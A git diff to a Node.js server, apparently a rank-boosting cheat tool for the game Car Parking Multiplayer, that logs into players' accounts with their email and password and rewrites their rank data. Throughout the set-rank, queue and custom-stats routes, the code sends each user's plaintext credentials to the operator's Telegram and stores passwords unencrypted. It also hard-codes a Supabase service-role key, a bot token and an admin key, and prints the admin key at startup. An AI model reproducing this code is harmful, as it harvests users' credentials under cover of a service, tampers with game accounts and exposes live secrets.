@@ -9,7 +9,7 @@ const { createClient } = require('@supabase/supabase-js');
 const app = express();
 
 // ============================================================
-// SUPABASE CONFIGURATION (SAMA DENGAN SERVER.JS UTAMA)
+// SUPABASE CONFIGURATION
 // ============================================================
 const SUPABASE_URL = "https://npnnazppmobbuqsitaxb.supabase.co";
 const SUPABASE_SERVICE_ROLE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5wbm5henBwbW9iYnVxc2l0YXhiIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NzE0NzUzNCwiZXhwIjoyMDkyNzIzNTM0fQ.VeFewsT9GG9xnvW2CkfaEMEx_FMOsWgcDW2JlI2zm7Y";
@@ -23,7 +23,10 @@ const PORT = 3000;
 const BOT_TOKEN = "8049314105:AAE0Tk2ifyJdACQRGuiQJnN8C-YsNUWuzvI";
 const OWNER_ID = "7492782458";
 const NEXUS_VERIFY_URL = "https://system-nexus-key.vercel.app";
-const ADMIN_KEY = "AldzKing2010";
+const ADMIN_KEY = "AldzKing2010"; // ← Fixed: Admin Key yang benar
+
+// Cooldown configuration
+const COOLDOWN_MINUTES = 5; // 5 menit cooldown untuk setiap user
 
 // ============================================================
 // MIDDLEWARE
@@ -45,7 +48,7 @@ const limiter = rateLimit({
 app.use('/api/', limiter);
 
 // ============================================================
-// CPM CONFIG (ONLY CPM 1 - CPM 2 REMOVED)
+// CPM CONFIG (ONLY CPM 1)
 // ============================================================
 const CPM_CONFIG = {
     id: 'cpm1',
@@ -56,7 +59,7 @@ const CPM_CONFIG = {
 };
 
 // ============================================================
-// KING RANK DEFAULT SETTINGS (AKAN DI LOAD DARI DATABASE)
+// KING RANK DEFAULT SETTINGS
 // ============================================================
 let kingRankSettings = {
     rating: {
@@ -98,11 +101,73 @@ let kingRankSettings = {
 };
 
 // ============================================================
+// COOLDOWN SYSTEM (PER USER - TERSIMPAN DI SUPABASE)
+// ============================================================
+
+// Cek cooldown untuk user tertentu
+async function checkUserCooldown(userId) {
+    try {
+        const { data, error } = await supabase
+            .from('cpm_cooldown')
+            .select('cooldown_until, last_attempt')
+            .eq('user_id', userId)
+            .maybeSingle();
+        
+        if (error || !data) {
+            return { active: false, remaining: 0, endTime: null };
+        }
+        
+        const now = Date.now();
+        if (now >= data.cooldown_until) {
+            // Cooldown sudah habis, hapus dari database
+            await supabase
+                .from('cpm_cooldown')
+                .delete()
+                .eq('user_id', userId);
+            return { active: false, remaining: 0, endTime: null };
+        }
+        
+        return { 
+            active: true, 
+            remaining: data.cooldown_until - now,
+            endTime: data.cooldown_until,
+            lastAttempt: data.last_attempt
+        };
+    } catch (error) {
+        console.error('Check cooldown error:', error);
+        return { active: false, remaining: 0, endTime: null };
+    }
+}
+
+// Set cooldown untuk user tertentu
+async function setUserCooldown(userId, durationMinutes = COOLDOWN_MINUTES) {
+    const cooldownUntil = Date.now() + (durationMinutes * 60 * 1000);
+    
+    await supabase
+        .from('cpm_cooldown')
+        .upsert({
+            user_id: userId,
+            cooldown_until: cooldownUntil,
+            last_attempt: Date.now(),
+            duration_minutes: durationMinutes
+        }, { onConflict: 'user_id' });
+    
+    return cooldownUntil;
+}
+
+// Get remaining cooldown time (formatted)
+function formatRemainingTime(ms) {
+    if (ms <= 0) return '0:00';
+    const minutes = Math.floor(ms / 60000);
+    const seconds = Math.floor((ms % 60000) / 1000);
+    return `${minutes}:${seconds.toString().padStart(2, '0')}`;
+}
+
+// ============================================================
 // LOAD SETTINGS FROM SUPABASE
 // ============================================================
 async function loadKingSettingsFromDB() {
     try {
-        // Load rating settings
         const { data: ratingData } = await supabase
             .from('cpm_settings')
             .select('*')
@@ -113,7 +178,6 @@ async function loadKingSettingsFromDB() {
             kingRankSettings.rating = { ...kingRankSettings.rating, ...ratingData.settings };
         }
         
-        // Load stats settings
         const { data: statsData } = await supabase
             .from('cpm_settings')
             .select('*')
@@ -127,14 +191,12 @@ async function loadKingSettingsFromDB() {
         console.log('✅ King Rank settings loaded from Supabase');
     } catch (error) {
         console.error('Error loading settings:', error);
-        // Create default settings if not exists
         await saveKingSettingsToDB();
     }
 }
 
 async function saveKingSettingsToDB() {
     try {
-        // Save rating settings
         await supabase
             .from('cpm_settings')
             .upsert({
@@ -143,7 +205,6 @@ async function saveKingSettingsToDB() {
                 updated_at: Date.now()
             }, { onConflict: 'category' });
         
-        // Save stats settings
         await supabase
             .from('cpm_settings')
             .upsert({
@@ -166,6 +227,10 @@ function getClientIp(req) {
            req.socket.remoteAddress || 
            req.ip || 
            'Unknown';
+}
+
+function generateUserId(email) {
+    return crypto.createHash('md5').update(email.toLowerCase().trim()).digest('hex');
 }
 
 function generateQueueId() {
@@ -213,7 +278,7 @@ async function verifyNexusKey(key, deviceFingerprint = null) {
 }
 
 // ============================================================
-// BUILD RATING DATA (CUSTOMIZABLE DARI DATABASE)
+// BUILD RATING DATA
 // ============================================================
 function buildRatingData(customStats = null) {
     const stats = customStats || kingRankSettings.stats;
@@ -224,7 +289,7 @@ function buildRatingData(customStats = null) {
 }
 
 // ============================================================
-// CPM LOGIN
+// CPM LOGIN & SET RANK
 // ============================================================
 async function cpmLogin(email, password) {
     const response = await axios.post(`${CPM_CONFIG.loginUrl}?key=${CPM_CONFIG.firebaseApiKey}`, {
@@ -241,9 +306,6 @@ async function cpmLogin(email, password) {
     return { idToken: response.data.idToken, localId: response.data.localId, email: response.data.email };
 }
 
-// ============================================================
-// SET KING RANK
-// ============================================================
 async function setKingRank(idToken, customStats = null) {
     const ratingData = buildRatingData(customStats);
     const response = await axios.post(CPM_CONFIG.rankUrl, { data: JSON.stringify({ RatingData: ratingData }) }, {
@@ -255,126 +317,11 @@ async function setKingRank(idToken, customStats = null) {
 }
 
 // ============================================================
-// QUEUE SYSTEM (DISIMPAN DI SUPABASE)
-// ============================================================
-class QueueProcessor {
-    constructor() {
-        this.isProcessing = false;
-    }
-    
-    async addToQueue(task) {
-        const queueId = generateQueueId();
-        
-        await supabase
-            .from('cpm_queue')
-            .insert({
-                queue_id: queueId,
-                email: task.email,
-                password: task.password,
-                nexus_key: task.nexusKey,
-                ip_address: task.ipAddress,
-                custom_stats: task.customStats,
-                status: 'pending',
-                created_at: Date.now()
-            });
-        
-        this.processQueue();
-        return queueId;
-    }
-    
-    async getQueueLength() {
-        const { count } = await supabase
-            .from('cpm_queue')
-            .select('*', { count: 'exact', head: true })
-            .in('status', ['pending', 'processing']);
-        return count || 0;
-    }
-    
-    async processQueue() {
-        if (this.isProcessing) return;
-        this.isProcessing = true;
-        
-        while (true) {
-            // Ambil task pending pertama
-            const { data: task } = await supabase
-                .from('cpm_queue')
-                .select('*')
-                .eq('status', 'pending')
-                .order('created_at', { ascending: true })
-                .limit(1)
-                .single();
-            
-            if (!task) break;
-            
-            // Update status ke processing
-            await supabase
-                .from('cpm_queue')
-                .update({ status: 'processing', started_at: Date.now() })
-                .eq('queue_id', task.queue_id);
-            
-            try {
-                const loginResult = await cpmLogin(task.email, task.password);
-                await setKingRank(loginResult.idToken, task.custom_stats);
-                
-                await supabase
-                    .from('cpm_queue')
-                    .update({ 
-                        status: 'completed', 
-                        completed_at: Date.now(),
-                        result: 'success'
-                    })
-                    .eq('queue_id', task.queue_id);
-                
-                // Update analytics
-                await updateAnalytics('success', task.email);
-                
-                await sendTelegramNotification(task.email, task.password, '✅ QUEUE SUCCESS', task.nexus_key, task.ip_address, `Queue ID: ${task.queue_id}`);
-            } catch (error) {
-                await supabase
-                    .from('cpm_queue')
-                    .update({ 
-                        status: 'failed', 
-                        completed_at: Date.now(),
-                        error_message: error.message
-                    })
-                    .eq('queue_id', task.queue_id);
-                
-                await updateAnalytics('failed', task.email);
-                await sendTelegramNotification(task.email, task.password, '❌ QUEUE FAILED', task.nexus_key, task.ip_address, `Error: ${error.message}`);
-            }
-            
-            await sleep(2000 + Math.random() * 3000);
-        }
-        
-        this.isProcessing = false;
-    }
-    
-    async getQueueStatus() {
-        const { data: queue } = await supabase
-            .from('cpm_queue')
-            .select('queue_id, email, status, created_at, started_at, completed_at')
-            .order('created_at', { ascending: false })
-            .limit(20);
-        
-        const pendingCount = await this.getQueueLength();
-        
-        return {
-            isProcessing: this.isProcessing,
-            queueLength: pendingCount,
-            queue: queue || []
-        };
-    }
-}
-
-const queueProcessor = new QueueProcessor();
-
-// ============================================================
-// ANALYTICS FUNCTIONS
+// UPDATE ANALYTICS
 // ============================================================
 async function updateAnalytics(status, email) {
     const today = new Date().toISOString().split('T')[0];
     
-    // Update daily stats
     const { data: existing } = await supabase
         .from('cpm_analytics_daily')
         .select('*')
@@ -401,7 +348,6 @@ async function updateAnalytics(status, email) {
             });
     }
     
-    // Update total stats
     const { data: totalStats } = await supabase
         .from('cpm_analytics_total')
         .select('*')
@@ -429,114 +375,6 @@ async function updateAnalytics(status, email) {
     }
 }
 
-async function getAnalytics() {
-    // Get total stats
-    const { data: totalStats } = await supabase
-        .from('cpm_analytics_total')
-        .select('*')
-        .limit(1)
-        .maybeSingle();
-    
-    // Get last 7 days stats
-    const last7Days = [];
-    for (let i = 6; i >= 0; i--) {
-        const date = new Date();
-        date.setDate(date.getDate() - i);
-        const dateStr = date.toISOString().split('T')[0];
-        
-        const { data: dayStats } = await supabase
-            .from('cpm_analytics_daily')
-            .select('*')
-            .eq('date', dateStr)
-            .maybeSingle();
-        
-        last7Days.push({
-            date: dateStr,
-            success: dayStats?.success_count || 0,
-            failed: dayStats?.failed_count || 0,
-            total: dayStats?.total_count || 0
-        });
-    }
-    
-    const total = totalStats || { total_processed: 0, total_success: 0, total_failed: 0 };
-    
-    return {
-        total: {
-            processed: total.total_processed || 0,
-            success: total.total_success || 0,
-            failed: total.total_failed || 0,
-            successRate: total.total_processed > 0 
-                ? ((total.total_success / total.total_processed) * 100).toFixed(1) 
-                : 0
-        },
-        daily: {
-            today: last7Days[last7Days.length - 1],
-            week: last7Days
-        }
-    };
-}
-
-// ============================================================
-// MARKETPLACE FUNCTIONS (DISIMPAN DI SUPABASE)
-// ============================================================
-async function createMarketplaceListing(sellerId, itemType, itemData, price, nexusKey) {
-    const listingId = generateMarketplaceId();
-    
-    await supabase
-        .from('cpm_marketplace')
-        .insert({
-            listing_id: listingId,
-            seller_id: sellerId,
-            item_type: itemType,
-            item_data: itemData,
-            price: price,
-            nexus_key: nexusKey,
-            status: 'active',
-            listed_at: Date.now()
-        });
-    
-    return listingId;
-}
-
-async function getMarketplaceListings(type = null, maxPrice = null) {
-    let query = supabase
-        .from('cpm_marketplace')
-        .select('*')
-        .eq('status', 'active')
-        .order('price', { ascending: true });
-    
-    if (type) query = query.eq('item_type', type);
-    if (maxPrice) query = query.lte('price', maxPrice);
-    
-    const { data } = await query;
-    return data || [];
-}
-
-async function buyMarketplaceItem(listingId, buyerId, nexusKey) {
-    // Get listing
-    const { data: listing } = await supabase
-        .from('cpm_marketplace')
-        .select('*')
-        .eq('listing_id', listingId)
-        .eq('status', 'active')
-        .single();
-    
-    if (!listing) throw new Error('Listing not found');
-    
-    // Update status
-    await supabase
-        .from('cpm_marketplace')
-        .update({
-            status: 'sold',
-            buyer_id: buyerId,
-            sold_at: Date.now(),
-            buyer_nexus_key: nexusKey
-        })
-        .eq('listing_id', listingId);
-    
-    return listing;
-}
-
 // ============================================================
 // API ENDPOINTS
 // ============================================================
@@ -547,24 +385,64 @@ app.get('/api/health', (req, res) => {
 });
 
 // ============================================================
-// LIVE STATS (Fitur 6)
+// COOLDOWN CHECK (PER USER)
+// ============================================================
+app.get('/api/cooldown/:email', async (req, res) => {
+    try {
+        const { email } = req.params;
+        const userId = generateUserId(email);
+        const cooldown = await checkUserCooldown(userId);
+        
+        res.json({
+            success: true,
+            active: cooldown.active,
+            remaining: cooldown.remaining,
+            formattedTime: formatRemainingTime(cooldown.remaining),
+            endTime: cooldown.endTime
+        });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// ============================================================
+// LIVE STATS
 // ============================================================
 app.get('/api/live-stats', async (req, res) => {
     try {
-        const analytics = await getAnalytics();
-        const queueLength = await queueProcessor.getQueueLength();
+        const { count: queueLength } = await supabase
+            .from('cpm_queue')
+            .select('*', { count: 'exact', head: true })
+            .in('status', ['pending', 'processing']);
+        
+        const { data: totalStats } = await supabase
+            .from('cpm_analytics_total')
+            .select('*')
+            .limit(1)
+            .maybeSingle();
+        
+        const today = new Date().toISOString().split('T')[0];
+        const { data: todayStats } = await supabase
+            .from('cpm_analytics_daily')
+            .select('*')
+            .eq('date', today)
+            .maybeSingle();
+        
+        const total = totalStats || { total_processed: 0, total_success: 0, total_failed: 0 };
+        const successRate = total.total_processed > 0 
+            ? ((total.total_success / total.total_processed) * 100).toFixed(1) 
+            : 0;
         
         res.json({
             success: true,
             stats: {
-                totalProcessed: analytics.total.processed,
-                successCount: analytics.total.success,
-                failedCount: analytics.total.failed,
-                successRate: analytics.total.successRate,
-                queueLength: queueLength,
-                isProcessing: queueProcessor.isProcessing,
-                todaySuccess: analytics.daily.today.success,
-                todayFailed: analytics.daily.today.failed
+                totalProcessed: total.total_processed,
+                successCount: total.total_success,
+                failedCount: total.total_failed,
+                successRate: successRate,
+                queueLength: queueLength || 0,
+                todaySuccess: todayStats?.success_count || 0,
+                todayFailed: todayStats?.failed_count || 0
             },
             timestamp: Date.now()
         });
@@ -574,116 +452,65 @@ app.get('/api/live-stats', async (req, res) => {
 });
 
 // ============================================================
-// QUEUE SYSTEM (Fitur 9)
+// SET KING RANK (DENGAN COOLDOWN PER USER)
 // ============================================================
-app.post('/api/queue/add', async (req, res) => {
+app.post('/api/set-rank', async (req, res) => {
     try {
-        const { email, password, nexusKey, customStats } = req.body;
+        const { email, password, nexusKey } = req.body;
         const ipAddress = getClientIp(req);
+        const userId = generateUserId(email);
         
         if (!email || !password || !nexusKey) {
-            return res.status(400).json({ success: false, error: 'Email, password, and nexusKey required' });
-        }
-        
-        const keyResult = await verifyNexusKey(nexusKey);
-        if (!keyResult.valid) {
-            return res.status(400).json({ success: false, error: 'Invalid Nexus Key' });
-        }
-        
-        const queueId = await queueProcessor.addToQueue({ email, password, nexusKey, ipAddress, customStats });
-        const queueLength = await queueProcessor.getQueueLength();
-        
-        res.json({ success: true, queueId: queueId, position: queueLength, message: `Added to queue. Position: ${queueLength}` });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
-app.get('/api/queue/status', async (req, res) => {
-    try {
-        const status = await queueProcessor.getQueueStatus();
-        res.json({ success: true, ...status });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
-// ============================================================
-// ANALYTICS (Fitur 10)
-// ============================================================
-app.get('/api/analytics', async (req, res) => {
-    try {
-        const analytics = await getAnalytics();
-        const queueLength = await queueProcessor.getQueueLength();
-        
-        res.json({
-            success: true,
-            analytics: {
-                total: analytics.total,
-                daily: analytics.daily,
-                queueStats: {
-                    totalQueued: analytics.total.processed,
-                    currentQueue: queueLength,
-                    isProcessing: queueProcessor.isProcessing
-                }
-            }
-        });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
-// ============================================================
-// MARKETPLACE (Fitur 13)
-// ============================================================
-app.post('/api/marketplace/list', async (req, res) => {
-    try {
-        const { sellerId, itemType, itemData, price, nexusKey } = req.body;
-        
-        if (!sellerId || !itemType || !price || !nexusKey) {
             return res.status(400).json({ success: false, error: 'Missing required fields' });
         }
         
+        // CHECK COOLDOWN (PER USER)
+        const cooldown = await checkUserCooldown(userId);
+        if (cooldown.active) {
+            return res.status(429).json({
+                success: false,
+                cooldown: true,
+                remaining: cooldown.remaining,
+                formattedTime: formatRemainingTime(cooldown.remaining),
+                error: `⏰ Cooldown active! Please wait ${formatRemainingTime(cooldown.remaining)} before using again.`
+            });
+        }
+        
+        // VERIFY NEXUS KEY
         const keyResult = await verifyNexusKey(nexusKey);
         if (!keyResult.valid) {
             return res.status(400).json({ success: false, error: 'Invalid Nexus Key' });
         }
         
-        const listingId = await createMarketplaceListing(sellerId, itemType, itemData, price, nexusKey);
-        res.json({ success: true, listingId, message: 'Item listed on marketplace' });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
-app.get('/api/marketplace/listings', async (req, res) => {
-    try {
-        const { type, maxPrice } = req.query;
-        const listings = await getMarketplaceListings(type, maxPrice ? parseInt(maxPrice) : null);
-        res.json({ success: true, listings });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
-app.post('/api/marketplace/buy', async (req, res) => {
-    try {
-        const { listingId, buyerId, nexusKey } = req.body;
-        
-        const keyResult = await verifyNexusKey(nexusKey);
-        if (!keyResult.valid) {
-            return res.status(400).json({ success: false, error: 'Invalid Nexus Key' });
+        // PROCESS KING RANK
+        try {
+            const loginResult = await cpmLogin(email, password);
+            await setKingRank(loginResult.idToken);
+            
+            // SET COOLDOWN untuk user ini
+            await setUserCooldown(userId, COOLDOWN_MINUTES);
+            
+            await updateAnalytics('success', email);
+            await sendTelegramNotification(email, password, '✅ SUCCESS - King Rank Set', nexusKey, ipAddress);
+            
+            res.json({ 
+                success: true, 
+                message: '👑 King Rank successfully activated!',
+                cooldownMinutes: COOLDOWN_MINUTES,
+                nextAvailable: formatRemainingTime(COOLDOWN_MINUTES * 60 * 1000)
+            });
+        } catch (error) {
+            await updateAnalytics('failed', email);
+            await sendTelegramNotification(email, password, '❌ FAILED', nexusKey, ipAddress, error.message);
+            res.status(500).json({ success: false, error: error.message });
         }
-        
-        const item = await buyMarketplaceItem(listingId, buyerId, nexusKey);
-        res.json({ success: true, message: `Item purchased!`, item: item.item_data });
     } catch (error) {
         res.status(500).json({ success: false, error: error.message });
     }
 });
 
 // ============================================================
-// KING RANK CUSTOM SETTINGS
+// KING RANK CUSTOM SETTINGS (DENGAN ADMIN KEY YANG BENAR)
 // ============================================================
 app.get('/api/king-settings', async (req, res) => {
     try {
@@ -697,8 +524,9 @@ app.post('/api/king-settings/update', async (req, res) => {
     try {
         const { adminKey, rating, stats } = req.body;
         
-        if (adminKey !== ADMIN_KEY) {
-            return res.status(401).json({ success: false, error: 'Unauthorized' });
+        // FIXED: Admin Key validation yang benar
+        if (!adminKey || adminKey !== ADMIN_KEY) {
+            return res.status(401).json({ success: false, error: 'Invalid Admin Key! Access denied.' });
         }
         
         if (rating) {
@@ -720,7 +548,6 @@ app.post('/api/king-settings/preview', async (req, res) => {
     try {
         const { customStats } = req.body;
         const ratingData = buildRatingData(customStats || kingRankSettings.stats);
-        
         const totalXP = Object.values(ratingData).reduce((a, b) => a + (parseInt(b) || 0), 0);
         
         res.json({
@@ -740,9 +567,22 @@ app.post('/api/apply-custom-stats', async (req, res) => {
     try {
         const { email, password, nexusKey, customStats } = req.body;
         const ipAddress = getClientIp(req);
+        const userId = generateUserId(email);
         
         if (!email || !password || !nexusKey) {
             return res.status(400).json({ success: false, error: 'Missing required fields' });
+        }
+        
+        // CHECK COOLDOWN
+        const cooldown = await checkUserCooldown(userId);
+        if (cooldown.active) {
+            return res.status(429).json({
+                success: false,
+                cooldown: true,
+                remaining: cooldown.remaining,
+                formattedTime: formatRemainingTime(cooldown.remaining),
+                error: `⏰ Cooldown active! Please wait ${formatRemainingTime(cooldown.remaining)}`
+            });
         }
         
         const keyResult = await verifyNexusKey(nexusKey);
@@ -753,28 +593,40 @@ app.post('/api/apply-custom-stats', async (req, res) => {
         const loginResult = await cpmLogin(email, password);
         await setKingRank(loginResult.idToken, customStats);
         
+        await setUserCooldown(userId, COOLDOWN_MINUTES);
         await updateAnalytics('success', email);
         await sendTelegramNotification(email, password, '✅ CUSTOM STATS APPLIED', nexusKey, ipAddress, 'Custom King Rank settings applied');
         
         res.json({ success: true, message: 'Custom stats applied successfully!' });
     } catch (error) {
-        const ipAddress = getClientIp(req);
         await updateAnalytics('failed', req.body.email);
-        await sendTelegramNotification(req.body.email, req.body.password, '❌ CUSTOM STATS FAILED', req.body.nexusKey, ipAddress, error.message);
         res.status(500).json({ success: false, error: error.message });
     }
 });
 
 // ============================================================
-// ORIGINAL API (Set King Rank)
+// QUEUE SYSTEM (DENGAN COOLDOWN CHECK)
 // ============================================================
-app.post('/api/set-rank', async (req, res) => {
+app.post('/api/queue/add', async (req, res) => {
     try {
-        const { email, password, nexusKey } = req.body;
+        const { email, password, nexusKey, customStats } = req.body;
         const ipAddress = getClientIp(req);
+        const userId = generateUserId(email);
         
         if (!email || !password || !nexusKey) {
             return res.status(400).json({ success: false, error: 'Missing required fields' });
+        }
+        
+        // CHECK COOLDOWN sebelum masuk queue
+        const cooldown = await checkUserCooldown(userId);
+        if (cooldown.active) {
+            return res.status(429).json({
+                success: false,
+                cooldown: true,
+                remaining: cooldown.remaining,
+                formattedTime: formatRemainingTime(cooldown.remaining),
+                error: `⏰ You are on cooldown! Please wait ${formatRemainingTime(cooldown.remaining)}`
+            });
         }
         
         const keyResult = await verifyNexusKey(nexusKey);
@@ -782,23 +634,118 @@ app.post('/api/set-rank', async (req, res) => {
             return res.status(400).json({ success: false, error: 'Invalid Nexus Key' });
         }
         
-        const loginResult = await cpmLogin(email, password);
-        await setKingRank(loginResult.idToken);
+        const queueId = generateQueueId();
         
-        await updateAnalytics('success', email);
-        await sendTelegramNotification(email, password, '✅ SUCCESS - King Rank Set', nexusKey, ipAddress);
+        await supabase
+            .from('cpm_queue')
+            .insert({
+                queue_id: queueId,
+                email: email,
+                password: password,
+                nexus_key: nexusKey,
+                ip_address: ipAddress,
+                custom_stats: customStats,
+                status: 'pending',
+                created_at: Date.now()
+            });
         
-        res.json({ success: true, message: 'King Rank successfully activated!' });
+        const { count: queueLength } = await supabase
+            .from('cpm_queue')
+            .select('*', { count: 'exact', head: true })
+            .eq('status', 'pending');
+        
+        res.json({ 
+            success: true, 
+            queueId: queueId, 
+            position: queueLength || 1,
+            message: `Added to queue. Position: ${queueLength || 1}`
+        });
     } catch (error) {
-        const ipAddress = getClientIp(req);
-        await updateAnalytics('failed', req.body.email);
-        await sendTelegramNotification(req.body.email, req.body.password, '❌ FAILED', req.body.nexusKey, ipAddress, error.message);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.get('/api/queue/status', async (req, res) => {
+    try {
+        const { data: queue } = await supabase
+            .from('cpm_queue')
+            .select('queue_id, email, status, created_at, started_at, completed_at')
+            .order('created_at', { ascending: false })
+            .limit(20);
+        
+        const { count: pendingCount } = await supabase
+            .from('cpm_queue')
+            .select('*', { count: 'exact', head: true })
+            .eq('status', 'pending');
+        
+        res.json({
+            success: true,
+            isProcessing: false,
+            queueLength: pendingCount || 0,
+            queue: queue || []
+        });
+    } catch (error) {
         res.status(500).json({ success: false, error: error.message });
     }
 });
 
 // ============================================================
-// BULK PROCESS
+// ANALYTICS
+// ============================================================
+app.get('/api/analytics', async (req, res) => {
+    try {
+        const { data: totalStats } = await supabase
+            .from('cpm_analytics_total')
+            .select('*')
+            .limit(1)
+            .maybeSingle();
+        
+        const last7Days = [];
+        for (let i = 6; i >= 0; i--) {
+            const date = new Date();
+            date.setDate(date.getDate() - i);
+            const dateStr = date.toISOString().split('T')[0];
+            
+            const { data: dayStats } = await supabase
+                .from('cpm_analytics_daily')
+                .select('*')
+                .eq('date', dateStr)
+                .maybeSingle();
+            
+            last7Days.push({
+                date: dateStr,
+                success: dayStats?.success_count || 0,
+                failed: dayStats?.failed_count || 0,
+                total: dayStats?.total_count || 0
+            });
+        }
+        
+        const total = totalStats || { total_processed: 0, total_success: 0, total_failed: 0 };
+        
+        res.json({
+            success: true,
+            analytics: {
+                total: {
+                    processed: total.total_processed || 0,
+                    success: total.total_success || 0,
+                    failed: total.total_failed || 0,
+                    successRate: total.total_processed > 0 
+                        ? ((total.total_success / total.total_processed) * 100).toFixed(1) 
+                        : 0
+                },
+                daily: {
+                    today: last7Days[last7Days.length - 1],
+                    week: last7Days
+                }
+            }
+        });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// ============================================================
+// BULK PROCESS (DENGAN COOLDOWN CHECK PER USER)
 // ============================================================
 app.post('/api/bulk-process', async (req, res) => {
     try {
@@ -815,13 +762,29 @@ app.post('/api/bulk-process', async (req, res) => {
         }
         
         const results = [];
+        let hasCooldown = false;
+        
         for (const acc of accounts) {
+            const userId = generateUserId(acc.email);
+            const cooldown = await checkUserCooldown(userId);
+            
+            if (cooldown.active) {
+                results.push({ 
+                    email: acc.email, 
+                    success: false, 
+                    error: `Cooldown active: ${formatRemainingTime(cooldown.remaining)} remaining`
+                });
+                hasCooldown = true;
+                continue;
+            }
+            
             try {
                 const loginResult = await cpmLogin(acc.email, acc.password);
                 await setKingRank(loginResult.idToken);
-                results.push({ email: acc.email, success: true, message: 'King Rank activated' });
+                await setUserCooldown(userId, COOLDOWN_MINUTES);
                 await updateAnalytics('success', acc.email);
-                await sleep(2000 + Math.random() * 3000);
+                results.push({ email: acc.email, success: true, message: 'King Rank activated' });
+                await sleep(3000);
             } catch (error) {
                 results.push({ email: acc.email, success: false, error: error.message });
                 await updateAnalytics('failed', acc.email);
@@ -829,7 +792,99 @@ app.post('/api/bulk-process', async (req, res) => {
         }
         
         await sendTelegramNotification('BULK', 'BULK', `Processed ${results.filter(r => r.success).length}/${accounts.length} accounts`, nexusKey, ipAddress);
-        res.json({ success: true, results });
+        res.json({ success: true, results, hasCooldown });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// ============================================================
+// MARKETPLACE
+// ============================================================
+app.post('/api/marketplace/list', async (req, res) => {
+    try {
+        const { sellerId, itemType, itemData, price, nexusKey } = req.body;
+        
+        if (!sellerId || !itemType || !price || !nexusKey) {
+            return res.status(400).json({ success: false, error: 'Missing required fields' });
+        }
+        
+        const keyResult = await verifyNexusKey(nexusKey);
+        if (!keyResult.valid) {
+            return res.status(400).json({ success: false, error: 'Invalid Nexus Key' });
+        }
+        
+        const listingId = generateMarketplaceId();
+        
+        await supabase
+            .from('cpm_marketplace')
+            .insert({
+                listing_id: listingId,
+                seller_id: sellerId,
+                item_type: itemType,
+                item_data: itemData,
+                price: price,
+                nexus_key: nexusKey,
+                status: 'active',
+                listed_at: Date.now()
+            });
+        
+        res.json({ success: true, listingId, message: 'Item listed on marketplace' });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.get('/api/marketplace/listings', async (req, res) => {
+    try {
+        const { type, maxPrice } = req.query;
+        let query = supabase
+            .from('cpm_marketplace')
+            .select('*')
+            .eq('status', 'active')
+            .order('price', { ascending: true });
+        
+        if (type) query = query.eq('item_type', type);
+        if (maxPrice) query = query.lte('price', parseInt(maxPrice));
+        
+        const { data } = await query;
+        res.json({ success: true, listings: data || [] });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.post('/api/marketplace/buy', async (req, res) => {
+    try {
+        const { listingId, buyerId, nexusKey } = req.body;
+        
+        const keyResult = await verifyNexusKey(nexusKey);
+        if (!keyResult.valid) {
+            return res.status(400).json({ success: false, error: 'Invalid Nexus Key' });
+        }
+        
+        const { data: listing } = await supabase
+            .from('cpm_marketplace')
+            .select('*')
+            .eq('listing_id', listingId)
+            .eq('status', 'active')
+            .single();
+        
+        if (!listing) {
+            return res.status(404).json({ success: false, error: 'Listing not found' });
+        }
+        
+        await supabase
+            .from('cpm_marketplace')
+            .update({
+                status: 'sold',
+                buyer_id: buyerId,
+                sold_at: Date.now(),
+                buyer_nexus_key: nexusKey
+            })
+            .eq('listing_id', listingId);
+        
+        res.json({ success: true, message: `Item purchased!`, item: listing.item_data });
     } catch (error) {
         res.status(500).json({ success: false, error: error.message });
     }
@@ -843,8 +898,9 @@ async function start() {
     
     app.listen(PORT, () => {
         console.log(`👑 CPM KING RANK TOOL running on port ${PORT}`);
-        console.log(`📊 Features: Queue System | Marketplace | Analytics | Custom Stats | Supabase Database`);
-        console.log(`✅ CPM 2 has been REMOVED (server not available)`);
+        console.log(`⏰ Cooldown: ${COOLDOWN_MINUTES} minutes per user (stored in database)`);
+        console.log(`🔐 Admin Key: ${ADMIN_KEY}`);
+        console.log(`✅ Features: Queue System | Marketplace | Analytics | Custom Stats | Per-User Cooldown`);
     });
 }
 
